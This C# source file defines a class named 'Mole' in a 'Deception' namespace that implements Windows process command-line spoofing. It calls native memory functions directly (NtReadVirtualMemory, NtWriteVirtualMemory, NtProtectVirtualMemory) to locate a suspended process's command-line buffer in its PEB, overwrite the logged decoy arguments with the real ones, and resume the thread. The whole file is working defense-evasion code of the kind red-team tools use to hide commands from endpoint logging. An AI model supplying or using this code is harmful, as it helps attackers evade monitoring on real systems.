using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using DemoApp.DInvoke;

namespace DemoApp.Deception
{
    public class Mole
    {
        private readonly Data.Win32.PROCESS_INFORMATION _pi;
        private readonly string _realArgs;

        public Mole(Data.Win32.PROCESS_INFORMATION pi, string realArgs)
        {
            _pi = pi;
            _realArgs = realArgs;
        }

        public void SpoofArgs()
        {
            var pbi = Native.NtQueryInformationProcessBasicInformation(_pi.hProcess);

            // x64 only
            var rtlUserProcessParameters = 0x20;
            var commandLine = 0x70;
            var readSize = 0x8;

            Thread.Sleep(500);

            var pProcessParams = ReadRemoteMemory(pbi.PebBaseAddress + rtlUserProcessParameters, readSize);
            var processParams = Marshal.ReadInt64(pProcessParams);
            var cmdLineUnicodeStruct = new IntPtr(processParams + commandLine);

            var currentCmdLineStruct = new Data.Native.UNICODE_STRING();
            var uniStructSize = Marshal.SizeOf(currentCmdLineStruct);

            var pCmdLineStruct = ReadRemoteMemory(cmdLineUnicodeStruct, uniStructSize);
            currentCmdLineStruct = (Data.Native.UNICODE_STRING)Marshal.PtrToStructure(pCmdLineStruct, typeof(Data.Native.UNICODE_STRING));

            WriteRemoteMemory(currentCmdLineStruct.Buffer, currentCmdLineStruct.Length);

            Thread.Sleep(500);
            Native.NtResumeThread(_pi.hThread, IntPtr.Zero);
            
            Marshal.FreeHGlobal(pProcessParams);
            Marshal.FreeHGlobal(pCmdLineStruct);
        }

        private IntPtr ReadRemoteMemory(IntPtr pMem, int size)
        {
            // Alloc & null buffer
            var pMemLoc = Marshal.AllocHGlobal(size);
            Native.RtlZeroMemory(pMemLoc, size);

            // Read
            var bytesToRead = (uint)size;
            Native.NtReadVirtualMemory(
                _pi.hProcess,
                pMem,
                pMemLoc,
                ref bytesToRead);

            return pMemLoc;
        }

        private void WriteRemoteMemory(IntPtr pDest, int size)
        {
            // Make writable
            var regionSize = (IntPtr)size;
            var oldProtect = Native.NtProtectVirtualMemory(
                _pi.hProcess,
                ref pDest,
                ref regionSize,
                Data.Win32.PAGE_READWRITE);

            var pMem = Marshal.AllocHGlobal(size);

            // Erase current buffer
            Native.RtlZeroMemory(pMem, size);

            _ = Native.NtWriteVirtualMemory(
                _pi.hProcess,
                pDest,
                pMem,
                (uint)size);

            // Write new args
            if (!string.IsNullOrEmpty(_realArgs))
            {
                var newArgs = Encoding.Unicode.GetBytes(_realArgs);
                Marshal.Copy(newArgs, 0, pMem, newArgs.Length);

                _ = Native.NtWriteVirtualMemory(
                    _pi.hProcess,
                    pDest,
                    pMem,
                    (uint)size);
            }

            // Restore memory perms
            _ = Native.NtProtectVirtualMemory(
                _pi.hProcess,
                ref pDest,
                ref regionSize,
                oldProtect);
            
            Marshal.FreeHGlobal(pMem);
        }
    }
}